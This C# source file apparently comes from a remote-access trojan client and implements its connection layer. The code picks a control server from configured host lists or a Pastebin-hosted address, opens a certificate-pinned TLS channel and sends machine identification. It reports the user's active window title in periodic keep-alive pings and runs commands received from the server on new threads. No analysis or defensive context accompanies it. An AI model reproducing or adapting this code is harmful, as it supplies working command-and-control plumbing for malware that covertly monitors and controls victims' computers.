using System;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using Client.Handle_Packet;
using Client.Helper;
using MessagePackLib.MessagePack;

namespace Client.Connection;

public static class ClientSocket
{
	public static Socket TcpClient { get; set; }

	public static SslStream SslClient { get; set; }

	private static byte[] Buffer { get; set; }

	private static long HeaderSize { get; set; }

	private static long Offset { get; set; }

	private static Timer KeepAlive { get; set; }

	public static bool IsConnected { get; set; }

	private static object SendSync { get; } = new object();


	private static Timer Ping { get; set; }

	public static int Interval { get; set; }

	public static bool ActivatePong { get; set; }

	public static void InitializeClient()
	{
		try
		{
			TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
			{
				ReceiveBufferSize = 51200,
				SendBufferSize = 51200
			};
			if (Settings.Pastebin == "null")
			{
				string text = Settings.Hosts.Split(new char[1] { ',' })[new Random().Next(Settings.Hosts.Split(new char[1] { ',' }).Length)];
				int port = Convert.ToInt32(Settings.Ports.Split(new char[1] { ',' })[new Random().Next(Settings.Ports.Split(new char[1] { ',' }).Length)]);
				if (IsValidDomainName(text))
				{
					IPAddress[] hostAddresses = Dns.GetHostAddresses(text);
					foreach (IPAddress address in hostAddresses)
					{
						try
						{
							TcpClient.Connect(address, port);
							if (TcpClient.Connected)
							{
								break;
							}
						}
						catch
						{
						}
					}
				}
				else
				{
					TcpClient.Connect(text, port);
				}
			}
			else
			{
				using WebClient webClient = new WebClient();
				NetworkCredential networkCredential = (NetworkCredential)(webClient.Credentials = new NetworkCredential("", ""));
				string[] array = webClient.DownloadString(Settings.Pastebin).Split(new string[1] { ":" }, StringSplitOptions.None);
				Settings.Hosts = array[0];
				Settings.Ports = array[new Random().Next(1, array.Length)];
				TcpClient.Connect(Settings.Hosts, Convert.ToInt32(Settings.Ports));
			}
			if (TcpClient.Connected)
			{
				IsConnected = true;
				SslClient = new SslStream(new NetworkStream(TcpClient, ownsSocket: true), leaveInnerStreamOpen: false, ValidateServerCertificate);
				SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint!.ToString()!.Split(new char[1] { ':' })[0], null, SslProtocols.Tls, checkCertificateRevocation: false);
				HeaderSize = 4L;
				Buffer = new byte[HeaderSize];
				Offset = 0L;
				Send(IdSender.SendInfo());
				Interval = 0;
				ActivatePong = false;
				KeepAlive = new Timer(KeepAlivePacket, null, new Random().Next(10000, 15000), new Random().Next(10000, 15000));
				Ping = new Timer(Pong, null, 1, 1);
				SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
			}
			else
			{
				IsConnected = false;
			}
		}
		catch
		{
			IsConnected = false;
		}
	}

	private static bool IsValidDomainName(string name)
	{
		return Uri.CheckHostName(name) != UriHostNameType.Unknown;
	}

	private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
	{
		return Settings.ServerCertificate.Equals(certificate);
	}

	public static void Reconnect()
	{
		try
		{
			SslClient?.Dispose();
			TcpClient?.Dispose();
			Ping?.Dispose();
			KeepAlive?.Dispose();
		}
		catch
		{
		}
		IsConnected = false;
	}

	public static void ReadServertData(IAsyncResult ar)
	{
		try
		{
			if (TcpClient.Connected && IsConnected)
			{
				int num = SslClient.EndRead(ar);
				if (num > 0)
				{
					Offset += num;
					HeaderSize -= num;
					if (HeaderSize == 0L)
					{
						HeaderSize = BitConverter.ToInt32(Buffer, 0);
						if (HeaderSize > 0L)
						{
							Offset = 0L;
							Buffer = new byte[HeaderSize];
							while (HeaderSize > 0L)
							{
								int num2 = SslClient.Read(Buffer, (int)Offset, (int)HeaderSize);
								if (num2 > 0)
								{
									Offset += num2;
									HeaderSize -= num2;
									if (HeaderSize < 0L)
									{
										IsConnected = false;
										return;
									}
									continue;
								}
								IsConnected = false;
								return;
							}
							new Thread(Packet.Read).Start(Buffer);
							Offset = 0L;
							HeaderSize = 4L;
							Buffer = new byte[HeaderSize];
						}
						else
						{
							HeaderSize = 4L;
							Buffer = new byte[HeaderSize];
							Offset = 0L;
						}
					}
					else if (HeaderSize < 0L)
					{
						IsConnected = false;
						return;
					}
					SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
				}
				else
				{
					IsConnected = false;
				}
			}
			else
			{
				IsConnected = false;
			}
		}
		catch
		{
			IsConnected = false;
		}
	}

	public static void Send(byte[] msg)
	{
		lock (SendSync)
		{
			try
			{
				if (!IsConnected)
				{
					return;
				}
				byte[] bytes = BitConverter.GetBytes(msg.Length);
				TcpClient.Poll(-1, SelectMode.SelectWrite);
				SslClient.Write(bytes, 0, bytes.Length);
				if (msg.Length > 1000000)
				{
					using (MemoryStream memoryStream = new MemoryStream(msg))
					{
						int num = 0;
						memoryStream.Position = 0L;
						byte[] array = new byte[50000];
						while ((num = memoryStream.Read(array, 0, array.Length)) > 0)
						{
							TcpClient.Poll(-1, SelectMode.SelectWrite);
							SslClient.Write(array, 0, num);
							SslClient.Flush();
						}
						return;
					}
				}
				TcpClient.Poll(-1, SelectMode.SelectWrite);
				SslClient.Write(msg, 0, msg.Length);
				SslClient.Flush();
			}
			catch
			{
				IsConnected = false;
			}
		}
	}

	public static void KeepAlivePacket(object obj)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "Ping";
			msgPack.ForcePathObject("Message").AsString = Methods.GetActiveWindowTitle();
			Send(msgPack.Encode2Bytes());
			GC.Collect();
			ActivatePong = true;
		}
		catch
		{
		}
	}

	private static void Pong(object obj)
	{
		try
		{
			if (ActivatePong && IsConnected)
			{
				Interval++;
			}
		}
		catch
		{
		}
	}
}
